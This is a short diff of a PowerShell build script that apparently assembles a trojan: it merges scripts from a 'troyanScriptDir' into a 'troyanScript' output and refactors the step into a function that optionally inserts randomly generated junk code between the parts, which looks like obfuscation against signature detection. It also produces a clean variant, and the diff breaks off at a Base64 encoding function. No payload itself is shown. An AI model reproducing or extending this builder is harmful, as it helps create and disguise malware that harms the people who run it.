@@ -114,18 +114,31 @@ if ($server.autoUpdate)
     $ps1Files += (Get-ChildItem -Path $server.troyanScriptDir -Filter "extraupdate.ps1")
 }
 
-$joinedContent = ""
-foreach ($file in $ps1Files) {
-    $fileContent = Get-Content -Path $file.FullName -Raw
-    $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
-    $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
-    $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
-    $joinedContent += Generate-RandomCode
-    $joinedContent += $fileContent + [System.Environment]::NewLine
-}
-$joinedContent += Generate-RandomCode
-$joinedContent | Set-Content -Path $server.troyanScript -Encoding UTF8
+function BuldScript{
+    param (
+        [string]$outputFile, [bool]$random)
 
+    $joinedContent = ""
+    foreach ($file in $ps1Files) {
+        $fileContent = Get-Content -Path $file.FullName -Raw
+        $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
+        $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
+        $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
+        if ($random -eq $true)
+        {
+            $joinedContent += Generate-RandomCode
+        }
+        $joinedContent += $fileContent + [System.Environment]::NewLine
+    }
+    if ($random -eq $true)
+    {
+        $joinedContent += Generate-RandomCode
+    }
+    $joinedContent | Set-Content -Path $outputFile -Encoding UTF8
+}
+
+BuldScript -outputFile $server.troyanScript -random $true
+BuldScript -outputFile $server.troyanScriptClean -random $false
 
 function Encode-FileToBase64 {
     param (
